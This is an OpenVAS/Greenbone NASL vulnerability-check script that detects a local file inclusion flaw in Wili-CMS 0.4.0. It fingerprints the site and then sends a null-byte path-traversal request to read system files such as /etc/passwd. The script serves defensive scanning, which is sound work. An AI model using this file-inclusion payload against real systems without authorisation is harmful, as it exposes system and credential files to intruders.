# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100021");
  script_version("2022-01-11T09:46:34+0000");
  script_tag(name:"last_modification", value:"2022-01-11 09:46:34 +0000 (Tue, 11 Jan 2022)");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Wili-CMS LFI/RFI/Authentication Bypass Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/8166/");

  script_tag(name:"summary", value:"Wili-CMS is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"The following flaws exist:

  - A remote and local file include (LFI/RFI) vulnerability because the software fails to
  sufficiently sanitize user-supplied data

  - An authentication bypass which allows a guest to login as admin");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to compromise the
  application and the underlying system. Other attacks are also possible.");

  script_tag(name:"affected", value:"Version 0.4.0 is known to be affected. Other versions might be
  affected as well.");

  script_tag(name:"solution", value:"Update to a newer version if available.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/index.php" );

  # e.g.:
  # <a href="http://wili-cms.sf.net">Wili-CMS</a>
  if( ! res || res !~ "^HTTP/1\.[01] 200" || res !~ "(https?://wili-cms\.(sf|sourceforge)\.net|>Wili-CMS<)" )
    continue;

  foreach pattern( keys( files ) ) {

    file = files[pattern];
    url = string( dir, "/?npage=-1&content_dir=/", file, "%00" );

    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
    if( ! buf )
      continue;

    if( egrep( pattern:pattern, string:buf ) ||
        egrep( pattern:"Warning.*:+.*include\(/" + file + "\).*failed to open stream", string:buf ) ) { # nb: /etc/passwd not found or not allowed to access. Windows or SAFE MODE Restriction.
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
